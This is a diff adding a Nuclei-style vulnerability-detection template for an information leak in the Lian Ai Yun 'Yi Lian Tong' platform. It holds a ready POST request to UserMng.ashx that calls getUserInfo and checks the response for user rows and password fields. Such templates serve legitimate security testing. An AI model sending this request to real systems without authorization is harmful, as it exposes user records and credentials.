@@ -1,0 +1,38 @@
+id: lian-ai-yun-usermng-info-leak
+
+info:
+  name: Lian Ai Yun User Management Information Leak
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: info-leak
+  description: |
+    Potential information leakage vulnerability in Lian Ai Yun "Yi Lian Tong" Smart Management Platform's UserMng.ashx endpoint.
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/UserMng.ashx"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: |
+      page=1&arr_search=%7B%22bmmc%22%3A%22%22%2C%22rfzt%22%3A%22%22%2C%22cardid%22%3A%22%22%2C%22klb%22%3A%22%22%2C%22ryxm%22%3A%22%22%2C%22rybh%22%3A%22%22%2C%22sex%22%3A%22%22%2C%22ryzt%22%3A%22%22%2C%22rfoperator%22%3A%22%22%2C%22EngName%22%3A%22%22%2C%22WeChat%22%3A%22%22%2C%22Tel%22%3A%22%22%2C%22groupname%22%3A%22%22%2C%22jituanname%22%3A%22%22%2C%22companyname%22%3A%22%22%2C%22startime%22%3A%22%22%2C%22endtime%22%3A%22%22%2C%22order%22%3A%22khrq+desc%22%7D&funcName=getUserInfo
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "text/plain"
+      - type: word
+        part: body
+        words:
+          - "\"rows\""
+          - "password"
+          - "userCount"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
